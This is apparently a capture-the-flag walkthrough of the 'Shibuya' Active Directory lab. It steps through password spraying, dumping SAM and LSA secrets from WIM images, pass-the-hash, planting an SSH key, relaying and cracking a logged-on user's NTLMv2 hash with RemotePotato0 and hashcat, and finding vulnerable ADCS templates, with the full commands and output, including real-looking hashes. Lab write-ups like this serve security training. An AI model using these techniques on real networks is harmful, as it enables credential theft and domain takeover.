## Shibuya

### Lab Details 

- Difficulty: Hard
- Type: AD, Windows

#### Enumeration
- run `nmap`
```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-02 09:39:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-02T09:40:26+00:00
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2025-11-01T09:35:51
|_Not valid after:  2026-05-03T09:35:51
|_ssl-date: 2025-11-02T09:41:06+00:00; 0s from scanner time.
```
- run  `Kerbrute` to enumerate for valid usernames
```bash
2025/11/04 07:25:13 >  [+] VALID USERNAME:	 purple@shibuya.vl
2025/11/04 07:25:13 >  [+] VALID USERNAME:	 red@shibuya.vl
2025/11/04 07:25:15 >  [+] VALID USERNAME:	 Purple@shibuya.vl
2025/11/04 07:25:16 >  [+] VALID USERNAME:	 Red@shibuya.vl
2025/11/04 07:25:18 >  [+] VALID USERNAME:	 RED@shibuya.vl
2025/11/04 07:25:18 >  [+] VALID USERNAME:	 PURPLE@shibuya.vl
2025/11/04 07:29:42 >  [+] VALID USERNAME:	 william.thomas@shibuya.vl
2025/11/04 07:33:27 >  [+] VALID USERNAME:	 stuart.taylor@shibuya.vl
2025/11/04 07:33:45 >  [+] VALID USERNAME:	 stacey.jones@shibuya.vl
2025/11/04 07:36:18 >  [+] VALID USERNAME:	 sally.brown@shibuya.vl
2025/11/04 07:43:12 >  [+] VALID USERNAME:	 melissa.jones@shibuya.vl
2025/11/04 07:43:13 >  [+] VALID USERNAME:	 melanie.grant@shibuya.vl
2025/11/04 07:47:17 >  [+] VALID USERNAME:	 kevin.green@shibuya.vl
2025/11/04 07:47:18 >  [+] VALID USERNAME:	 kerry.hall@shibuya.vl
2025/11/04 07:47:20 >  [+] VALID USERNAME:	 kenneth.shaw@shibuya.vl
2025/11/04 07:47:24 >  [+] VALID USERNAME:	 kelly.davies@shibuya.vl
2025/11/04 07:47:40 >  [+] VALID USERNAME:	 karl.brown@shibuya.vl
```
- use `smbclient` to check for `SMB` access with found credentials
- below are the usernames and password lists to perform the spray
```bash
$ cat AD_Usernames.txt
purple
red
Purple
Red
RED
PURPLE
william.thomas
stuart.taylor
stacey.jones
sally.brown
melissa.jones
melanie.grant
kevin.green
kerry.hall
kenneth.shaw
kelly.davies
karl.brown
gary.wood
emma.noble
dylan.brown
david.poole
craig.wright
christopher.jones
charlene.walsh
brandon.jones
Russell.Phillips

$ cat english-basic.txt
Password1
Welcome1
Letmein1
Password123
Welcome123
Letmein123
purple
red
Purple
Red
RED
PURPLE
william.thomas
stuart.taylor
stacey.jones
sally.brown
melissa.jones
melanie.grant
kevin.green
kerry.hall
kenneth.shaw
kelly.davies
karl.brown
gary.wood
emma.noble
dylan.brown
david.poole
craig.wright
christopher.jones
charlene.walsh
brandon.jones
```
- run the credential spray with usernames and passwords list
```bash
$ nxc smb 10.129.234.42 -u AD_Usernames.txt -p english-basic.txt -k --continue-on-success > nxc_smb_password_brute.output

$ cat nxc_smb_password_brute.output
<SNIP>
SMB                      10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\red:red 
<SNIP>
SMB                      10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\PURPLE:purple 
<SNIP>
```
- found two valid credentials with the credential spray `red:red` & `purple:purple`
- check `SMB` share access with `red` credential 
```bash
$ nxc smb 10.129.234.42 -u red -p red -k --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         10.129.234.42   445    AWSJPDC0522      [-] Error getting user: list index out of range
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$                         
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ     
```
- check `SMB` share access with `purple` credential
```bash
$ nxc smb 10.129.234.42 -u purple -p purple -k --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\purple:purple 
SMB         10.129.234.42   445    AWSJPDC0522      [-] Error getting user: list index out of range
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$                         
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
- enumerate AD Users with `red` credential using `Kerberos Authentication`
```bash
$ cat nxc_smb_kerberos_users.output 
SMB                      10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB                      10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB                      10.129.234.42   445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-                                
SMB                      10.129.234.42   445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB                      10.129.234.42   445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB                      10.129.234.42   445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account 
SMB                      10.129.234.42   445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV 
<SNIP>
```
- we see the `svc_autojoin` user with a password in the `description` field
- check `svc_autojoin` credential with `nxc`
```bash
$ nxc smb 10.129.234.42 -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV'
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV
```
- password is valid
#### Initial Foothold 
- enumerate the shares using `impacket-smbclient`
```bash
$ impacket-smbclient -k shibuya.vl/svc_autojoin:'K5&A6Dw9d8jrKWhV'@AWSJPDC0522.shibuya.vl
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands

```
- we see there's images$ share that we have read access over 
```
# shares
ADMIN$
C$
images$
IPC$
NETLOGON
SYSVOL
users
```
- check the images$ share and download everything from remote share 
```
# use images$
# ls
drw-rw-rw-          0  Wed Feb 19 11:35:20 2025 .
drw-rw-rw-          0  Tue Apr  8 19:09:45 2025 ..
-rw-rw-rw-    8264070  Wed Feb 19 11:35:20 2025 AWSJPWK0222-01.wim
-rw-rw-rw-   50660968  Wed Feb 19 11:35:20 2025 AWSJPWK0222-02.wim
-rw-rw-rw-   32065850  Wed Feb 19 11:35:20 2025 AWSJPWK0222-03.wim
-rw-rw-rw-     365686  Wed Feb 19 11:35:20 2025 vss-meta.cab
# mget *
[*] Downloading AWSJPWK0222-01.wim
[*] Downloading AWSJPWK0222-02.wim
[*] Downloading AWSJPWK0222-03.wim
[*] Downloading vss-meta.cab
# exit
```
- we can attempt to mount the `wim` files using `wimmount`
```bash
$ sudo apt install wimtools
$ sudo wimmount AWSJPWK0222-02.wim /mnt
```
- check the content of the mounted `WIM` file 
```bash
┌─[root@htb-kafiafqeyt]─[//mnt]
└──╼ #ls
BBI
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
BBI.LOG1
BBI.LOG2
BCD-Template
BCD-Template.LOG
COMPONENTS
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TM.blf
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
COMPONENTS.LOG1
COMPONENTS.LOG2
DEFAULT
DEFAULT.LOG1
DEFAULT.LOG2
DRIVERS
DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
DRIVERS.LOG1
DRIVERS.LOG2
ELAM
ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TM.blf
ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
ELAM.LOG1
ELAM.LOG2
Journal
netlogon.ftl
RegBack
SAM
SAM.LOG1
SAM.LOG2
SECURITY
SECURITY.LOG1
SECURITY.LOG2
SOFTWARE
SOFTWARE.LOG1
SOFTWARE.LOG2
SYSTEM
SYSTEM.LOG1
SYSTEM.LOG2
systemprofile
TxR
```
- we can attempt to dump the hash from the `WIM` directory since it includes `SAM, SYSTEM and SECURITY` hives
```
$ impacket-secretsdump -system /mnt/SYSTEM -sam /mnt/SAM -security /mnt/SECURITY local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up... 
```
- we see the `DCC2` hash of user `Simon.Watson` from the hash dump 
- we also find `operator` account in the hash dump 
- we can attempt to perform hash reuse from the hash dump against`Simon.Watson`
- found we can use `operator`'s hash to authenticate as `Simon.Watson`
```bash
$ nxc smb 10.129.29.136 -u "Simon.Watson" -H '5d8c3d1a20bd63f60f469f6763ca0d50'
SMB         10.129.29.136   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.29.136   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 
```
- from the service enumeration `SSH` was discovered and `users` share exists `SMB`  listing 
- we can attempt to generate and add our `SSH` key to the `users` share under user `Simon.Watson`
- first generate the `SSH` key pair
```bash
$ ssh-keygen -t ed25519

$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP139KnasnDQ4vsMPOAGywPSkyR/KjeOO+7TbPJ36z6h ch4os1@htb-kafiafqeyt" > authorized_keys
```
- then put the `authorized_keys` containing our public key value to `users\Simon.Watson` directory
```bash
$ impacket-smbclient simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use users
# cd simon.watson
# cd .ssh
# put authorized_keys
 ```
- `SSH` into target as `Simon.Watson` using the public key file
```bash
$ ssh -i ./id_ed25519 simon.watson@shibuya.vl

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.
                                                                                                                                                                        shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>whoami                                                                                                           shibuya\simon.watson                                          
```
#### Lateral Movement (If any)

- check for current session using `RunasCs.exe`
```powershell
PS C:\Users\simon.watson> .\RunasCs.exe -l 9 attacker attacker qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn
 rdp-tcp                                 65536  Listen
```
- we see the user `Nigel.Mills` is currently logged on 
- we can attempt to perform a `Cross Session Replay` Attack using `RemotePotato0.exe`
- firstly, set up the local server for replay
```bash
$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.29.136:8888
```
- then, execute `RemotePotato0.exe` to replay the hash to local host
```powershell
PS C:\Users\simon.watson> .\RemotePotato0.exe -m 2 -r 10.10.14.71 -x 10.10.14.71 -p 8888 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.14.71 to your victim machine on port 8888
[*] Example Network redirector: 
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:fea324899a96b409:60b9cead3cc4d71f7d4380fa57698a96:01010000000000000a399b15624edc018e3e2ebc90c651e10000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c00070008000a399b15624edc01060004000600000008003000300000000000000001000000002000008f770371d46c9d2edc872e0dac0af2e70a2dd84d52eb159fa6a62d7445784a6a0a00100000000000000000000000000000000000090000000000000000000000
```
- below is what we see on our end, after success replay attack
```bash
> 2025/11/05 08:40:09.000232354  length=116 from=0 to=115
..\v.....t...........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............< 2025/11/05 08:40:09.000234153  length=84 from=0 to=83
..\f.....T.............X...8888...........]........\b.+.H`............................> 2025/11/05 08:40:09.000235771  length=24 from=116 to=139
........................< 2025/11/05 08:40:09.000237611  length=40 from=84 to=123
........(...............................> 2025/11/05 08:40:09.000245202  length=120 from=0 to=119
..\v\a....x.(...........X.............`R.......!4z.....]........\b.+.H`....
.......NTLMSSP.......\b.................
.|O....< 2025/11/05 08:40:09.000248498  length=294 from=0 to=293
..\f\a....&.............X...8888...........]........\b.+.H`....
.......NTLMSSP.........8....... .M./*Y.............F...
.|O....S.H.I.B.U.Y.A.....S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.\vh..bN......> 2025/11/05 08:40:09.000251771  length=616 from=120 to=735
...\a................
.......NTLMSSP.............B.B.........X.......f.......|...............
.|O.....-NY..@Cf.Jlx[..S.H.I.B.U.Y.A.N.i.g.e.l...M.i.l.l.s.A.W.S.J.P.D.C.0.5.2.2..........................(...h.aY\a'.:.I.........\vh..bN..D-6'............S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.\vh..bN..........\b.0.0............ ...w.q.l.....\r.
..
-.MR.....-tExJj
...................	.".R.P.C.S.S./.1.0...1.0...1.4...7.1..................i..._?
........P................`RI'.v.........\a...............
............J..........< 2025/11/05 08:40:09.000255740  length=32 from=294 to=325
........ ....... ...............> 2025/11/05 08:40:09.000261157  length=72 from=0 to=71
..\v.....H.............X.............`R.......!4z.....]........\b.+.H`....< 2025/11/05 08:40:09.000262778  length=60 from=0 to=59
..\f.....<.............X...8888...........]........\b.+.H`....> 2025/11/05 08:40:09.000264323  length=42 from=72 to=113
........*................`RI'.v.........\a.< 2025/11/05 08:40:09.000266095  length=108 from=60 to=167
........l.......T...................\a.1.2.7...0...0...1.[.9.9.9.7.].....
...........""33DDUUUUUU......\a.....
```
- crack the hash using `hashcat`, mode for `NTLMv2`
```bash
$ hashcat -m 5600 Nigel.Mills.NTLMv2.Hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) Ultra 7 155H, 2944/5888 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5575 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

NIGEL.MILLS::SHIBUYA:fea324899a96b409:60b9cead3cc4d71f7d4380fa57698a96:01010000000000000a399b15624edc018e3e2ebc90c651e10000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c00070008000a399b15624edc01060004000600000008003000300000000000000001000000002000008f770371d46c9d2edc872e0dac0af2e70a2dd84d52eb159fa6a62d7445784a6a0a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: NIGEL.MILLS::SHIBUYA:fea324899a96b409:60b9cead3cc4d...000000
Time.Started.....: Wed Nov  5 06:44:17 2025 (0 secs)
Time.Estimated...: Wed Nov  5 06:44:17 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1772.4 kH/s (1.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 229376/14344385 (1.60%)
Rejected.........: 0/229376 (0.00%)
Restore.Point....: 225280/14344385 (1.57%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: astigg -> 17021982
Hardware.Mon.#01.: Util: 38%

Started: Wed Nov  5 06:44:16 2025
Stopped: Wed Nov  5 06:44:19 2025
```
- we get the plaintext password for user `Nigel.Mills`
#### Privilege Escalation
- login to target as `Nigel.Mills`
```bash
$ ssh nigel.mills@shibuya.vl
nigel.mills@shibuya.vl's password: 

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.
```
- check our group access on `Nigel.Mills`
```
shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SHIBUYA\shibuya                             Group            S-1-5-21-87560095-894484815-3652015022-1108 Mandatory group, Enabled by default, Enabled group
SHIBUYA\ssh                                 Group            S-1-5-21-87560095-894484815-3652015022-3101 Mandatory group, Enabled by default, Enabled group
SHIBUYA\t1_admins                           Group            S-1-5-21-87560095-894484815-3652015022-1103 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```
- check for `ADCS` configured on attack
- this host is vulnerable to `ESC1, ESC2 and ESC3` 
```bash
$ proxychains -q certipy find -u nigel.mills -p Sail2Boat3 -dc-ip 10.129.29.136 -vulnerable -dns-tcp -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
[*] Successfully retrieved CA configuration for 'shibuya-AWSJPDC0522-CA'
[*] Checking web enrollment for CA 'shibuya-AWSJPDC0522-CA' @ 'AWSJPDC0522.shibuya.vl'
[!] Error checking web enrollment: Server disconnected without sending a response.
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1000)
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Template Created                    : 2025-02-15T07:37:49+00:00
    Template Last Modified              : 2025-02-19T10:58:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Full Control Principals         : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Property Enroll           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
```
